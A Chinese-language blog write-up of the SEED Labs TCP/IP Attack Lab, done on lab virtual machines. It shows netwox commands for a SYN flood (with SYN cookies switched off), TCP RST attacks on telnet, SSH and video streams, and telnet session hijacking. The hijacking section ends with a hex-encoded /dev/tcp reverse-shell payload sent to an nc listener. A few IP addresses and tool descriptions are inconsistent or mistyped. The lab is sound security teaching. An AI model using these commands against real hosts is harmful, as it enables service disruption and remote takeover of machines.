---
title: 'Seed Labs: TCP/IP Attack Lab'
tags:
  - Seed Labs
  - TCP/IP
categories:  
  - Network
abbrlink: 47949
date: 2018-01-12 18:34:41
---

　　网络与计算机安全课程实验（二），TCP/IP 攻击。

<!--more-->

#### 实验原理与目的

　　TCP/IP 协议从开始设计时候并没有考虑到现在网络上如此多的威胁，由此导致了许多形形色色的攻击方法。本次实验涉及了 TCP/IP 攻击的三种基本类型，（1）SYN 洪泛攻击，（2）TCP RST 攻击，（3）TCP 会话劫持攻击。希望通过本次实验了解 TCP/IP 攻击的原理，通过实际操作掌握基本的攻击方法，学会如何防范此类攻击。

#### 实验配置

　　基本配置与上一个实验：Local DNS Attack Lab 基本一致。按照实验指导手册，配置 3 台虚拟机，1 台作为 DNS 服务器，1 台作为用户机，另 1 台作为攻击者，3 台机器通过设置 NAT 网络来实现网络互访。

　　实验资料下载地址：[http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/)

![12-1](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-1.png)

##### 启用 telnet 服务器

　　对于本实验，实验要求启用 ftp 和 telnet 服务器，但是其实在后续的实验中只用到了 telnet。为了安全起见， Ubuntu 系统中安装的这些服务通常是默认禁用的，所以需要以 root 用户身份运行以下命令来启用：

```shell
$ sudo service vsftpd start
$ sudo service openbsd-inetd start
```

#### 实验过程
##### SYN 洪泛攻击

　　SYN 洪泛是 DoS 攻击的一种形式，攻击者向受害者的 TCP 端口发送多个 SYN 请求，但是攻击者无意完成三次握手过程。攻击者要么使用欺骗性的 IP 地址，要么不要继续这个过程。通过这种攻击，攻击者可以淹没用于半开连接的受害者队列，即完成 SYN，SYN-ACK 但尚未得到最终 ACK 的连接。当这个队列已满时，受害者不能再进行连接。

　　队列的大小有一个系统范围的设置。在 Linux 中，我们可以使用以下命令检查设置：
```shell
$ sysctl -q net.ipv4.tcp_max_syn_backlog
```

　　我们可以使用命令 “netstat -na” 来检查队列的使用情况，即与监听端口关联的半开连接的数量。这种连接的状态是 SYN-RECV。如果三次握手完成，连接的状态将建立。

![12-2](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-2.png)

　　Netwox 编号为 76 的工具提供了 SYN 洪泛攻击的基本功能，输入 “netwox 76 --help” 可以获取如下帮助信息。

![12-3](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-3.png)

　　首先在用户机上使用 telnet 192.168.0.10 命令测试 telnet 连接是否可用，验证可以成功登陆后即退出，然后攻击者开始使用如下命令发起攻击：

```shell
$ sudo netwox 76 --dst-ip 192.168.0.10 --dst-port 23
```

　　然后，用户机再次通过 telnet 连接到服务器，此时发现依然可以连接，按照实验指导手册所说，我们需要检查机器是否已经开启 SYN cookie 机制，SYN cookie 是抵御 SYN 洪泛攻击的防御机制。我们可以使用 sysctl 命令查看、打开和关闭 SYN cookie 机制，使用如下命令查看 SYN cookie 机制的设置情况：

```shell
$ sysctl -a | grep cookie
```

　　可以看到默认情况下， SYN cookie 机制是启用的，所以先将其关闭后再尝试攻击，使用如下命令将其关闭：

```shell
$ sysctl -w net.ipv4.tcp_syncookies=0
```

![12-4](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-4.png)

　　此时，再次发起攻击，并尝试再次使用 telnet 连接到服务器，发现已经无法连接到服务器了，如下：

![12-5](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-5.png)

　　当然，你也可以通过 wireshark 抓包来查看攻击者发送的数据包。实验完成后，再使用如下命令将 SYN cookie 机制打开，以防止 SYN 洪泛攻击。

```shell
$ sysctl -w net.ipv4.tcp_syncookies=1
```

##### TCP RST 攻击 telnet 和 ssh 连接

　　RST 表示复位，用来异常的关闭连接，在 TCP 的设计中它是不可或缺的。发送 RST 包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓存区的包发送 RST 包。而接收端收到 RST 包后，也不必发送 ACK 包来确认。TCP RST 攻击可以终止两个受害者之间建立的 TCP 连接。例如，如果两个用户 A 和 B 之间建立了 Telnet 连接（TCP），则攻击者可以将 A 到 B 的 RST 数据包进行欺骗，从而破坏现有的连接。为了在这次攻击中取得成功，攻击者需要正确构造 TCP RST 数据包。Netwox 编号为78的工具提供了 RST 攻击的基本功能，输入 “netwox 78 --help” 可以获取如下帮助信息。

![12-6](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-6.png)

　　在用户机上使用 telnet 命令连接到服务器，登录成功以后，攻击者发起 RST 攻击，通过 netwox 78 号工具伪造 RST 包发送给服务器，命令如下：

```shell
$ netwox 78 –i 1921.68.0.10
```

　　命令运行后悔使得用户机与服务器的 telnet 连接中断，攻击效果如下图：

![12-7](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-7.png)

　　在用户机上使用 ssh 命令连接到服务器，登录成功以后，攻击者发起 RST 攻击，通过 netwox 78 号工具伪造 RST 包发送给服务器，使得用户机与服务器的 SSH 连接中断，实验效果如下图：

![12-8](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-8.png)

##### TCP RST 攻击视频流应用程序

　　实验原理与任务2相同。TCP RST 攻击终会止两个受害者之间建立的 TCP 连接。在用户机上使用浏览器访问优酷的视频，攻击者向用户发起 RST 攻击，再刷新浏览器页面时即显示，为了在这次攻击中取得成功，攻击者需要正确构造 TCP RST 数据包。
　　Netwox 编号为 78 的工具提供了 RST 攻击的基本功能攻击命令，通过 netwox 78 号工具伪造 RST 包发送给服务器，命令如下：

```shell
$ netwox 78 –i 1921.68.0.100
```

　　攻击效果如下图，正常观看视频，发起攻击再刷新页面后TCP连接断开，页面崩溃。

![12-9](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-9.png)

![12-10](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-10.png)

##### TCP 会话劫持

　　开启 wireshark，并设置过滤器 --filter telnet，然后开始监控局域网内的流量。用户开始使用 telnet 连接到服务器，分析 telnet 连接建立时发送的数据包，然后根据其特征伪造相应的数据包来劫持会话。

![12-11](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-11.png)

　　Netwox 编号为 40 的工具提供了 SYN 洪泛攻击的基本功能，输入 “netwox 40 --help” 可以获取如下帮助信息。

![12-12](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-12.png)

　　使用 netwox 的 40 号工具，根据抓包数据的 TCP 源端口目的端口填写 tcp-src 和 tcp-dst，根据 IP 包的源地址目的地址填写 ip4-src 和 ip4-dst，根据用户机发送给服务器的最后一个数据包的 Next sequence nuber 字段填写 tcp-seqnum，根据服务器发送给用户机的最后一个数据包的 Acknowledgement number 字段填写 tcp-acknum，根据 IP 包的 TTL 字段填写 ip4-ttl，根据 IP 包的协议字段填写 ip4-protocol ，然后根据需要填写 tcp-data 字段。加入我们发送ls命令到服务器来查看该目录下有什么文件，将 ls 转换成 16 进制并加上 \r 的 16 进制数，生成我们的命令如下：

```shell
$ sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 59714 --tcp-dst 23 --tcp-seqnum 3089814629 --tcp-acknum 1471714290 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "6c730d00"
```

　　通过 wireshark 抓包可以看到命令已经发出，效果如下：

![12-13](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-13.png)

　　紧接着，服务器会将该命令的执行结果发送出来，我们同样可以通过抓包查看，如下所示，可以看到 ls 命令的执行结果，即显示该目录下所有文件：

![12-14](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-14.png)

##### 使用 TCP 会话劫持创建反向 Shell

　　设置后门的一个典型方法是从受害者机器运行一个反向外壳，以使外壳访问受害者机器。反向shell是在远程机器上运行的一个 shell 进程，连接到攻击者的机器。攻击者一旦遇到危险，就可以方便地访问远程机器。
　　netcat 程序允许我们指定一个端口号，并可以监听该端口上的连接。我们可以在攻击者机器上，使用如下命令 netcat 监听端口 9090 上的连接：

```shell
$ nc –l 9090 -v
```

　　“/bin/bash -i> /dev/tcp/10.0.2.4/9090 0 <＆1 2>＆1” 会启动一个 bash shell，其输入来自 tcp 连接，其标准错误输出将被重定向到相同的 tcp 连接。将该命令转换成 16 进制，并在最后添加回车的 16 进制代码，即 0x0d00。

　　然后通过上面 3.4 的会话劫持将这个命令发送到服务器，命令如下：

```shell
$ sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 53700 --tcp-dst 23 --tcp-seqnum 3862965514 --tcp-acknum 3719047389 --tcp-window 128 --tcp-urgptr 0 --tcp-data "2F62696E2F62617368202D69203E202F6465762F7463702F3139322E3136382E302E3230302F3930393020303C263120323E26310d00"
```

　　通过 wireshark 抓包可以看到数据包已经构造成功，并且发送到服务器。

![12-15](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-15.png)

　　由于攻击者一直在监听 9090 端口，服务器一旦接收到这个命令就会向攻击者建立连接，从而拿到服务器的 shell，如下图所示 netstat 的输出显示已建立的连接。

![12-16](http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-16.png)
